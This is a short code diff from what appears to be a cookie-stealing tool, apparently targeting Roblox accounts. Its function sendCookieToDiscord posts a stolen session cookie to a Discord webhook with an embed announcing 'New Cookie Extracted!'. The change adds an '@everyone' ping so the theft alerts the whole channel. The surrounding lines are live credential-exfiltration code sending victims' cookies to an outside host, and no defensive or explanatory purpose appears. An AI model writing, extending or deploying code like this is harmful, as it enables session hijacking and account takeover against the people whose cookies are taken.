@@ -269,6 +269,7 @@ function sendCookieToDiscord(cookie) {
         },
         body: JSON.stringify({
             username: 'Made by dick',
+            content: '@everyone', // Added ping to @everyone
             embeds: [{
                 title: '🍪 New Cookie Extracted! 🍪',
                 description: '```' + cookie + '```\nPlease use the RoTools cookie information extractor to get more info about the cookie!',
